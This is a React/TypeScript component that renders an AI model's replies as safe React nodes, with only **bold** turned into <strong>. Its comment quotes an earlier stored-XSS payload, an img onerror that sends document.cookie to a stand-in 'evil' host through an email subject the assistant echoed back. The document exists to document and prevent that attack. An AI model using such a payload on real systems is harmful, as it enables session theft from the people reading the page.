import type { ReactNode } from "react";

/**
 * Renders Nova's reply as React nodes: `**bold**` becomes <strong>, newlines are
 * preserved by the container's `whitespace-pre-wrap`.
 *
 * Not `dangerouslySetInnerHTML`, which is what this component replaced.
 *
 * The assistant's output is not trusted input: it echoes ticket subjects, contact
 * names and email addresses back to the user, all of which arrive from inbound
 * email. A subject line of
 * `<img src=x onerror="fetch('//evil/'+document.cookie)">` was a stored XSS that
 * fired the moment an agent asked the assistant to list open tickets — reachable
 * by anybody who can send an email to a monitored mailbox.
 */
export function NovaMarkup({ text }: { text: string }) {
	return <>{formatBold(text)}</>;
}

function formatBold(text: string): ReactNode[] {
	const nodes: ReactNode[] = [];
	// Non-greedy, no nesting: a heavier parser would be a second place for the
	// same class of bug to live.
	const pattern = /\*\*(.+?)\*\*/g;
	let lastIndex = 0;
	let match: RegExpExecArray | null;
	let key = 0;

	while ((match = pattern.exec(text)) !== null) {
		if (match.index > lastIndex) nodes.push(text.slice(lastIndex, match.index));
		nodes.push(<strong key={key++}>{match[1]}</strong>);
		lastIndex = match.index + match[0].length;
	}
	if (lastIndex < text.length) nodes.push(text.slice(lastIndex));

	return nodes;
}
